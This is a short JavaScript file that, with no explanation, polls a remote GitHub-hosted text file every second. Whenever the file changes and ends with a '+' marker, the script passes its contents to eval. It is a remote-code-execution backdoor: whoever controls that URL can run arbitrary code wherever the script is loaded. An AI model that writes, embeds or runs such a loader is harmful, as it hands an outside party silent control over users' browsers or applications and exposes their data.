function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}

async function main_loop() {
  while (true) {
    var value = httpGet("https://raw.githubusercontent.com/LudvigDK/LudvigDK.github.io/main/hm/to_run.txt").toString()
    if (value != last_value && value[value.length-1] == "+") {
      eval(value.substring(0, value.length - 1))
    }
    var last_value = value
    await new Promise(resolve => setTimeout(resolve, 1000));
  }
}

main_loop()
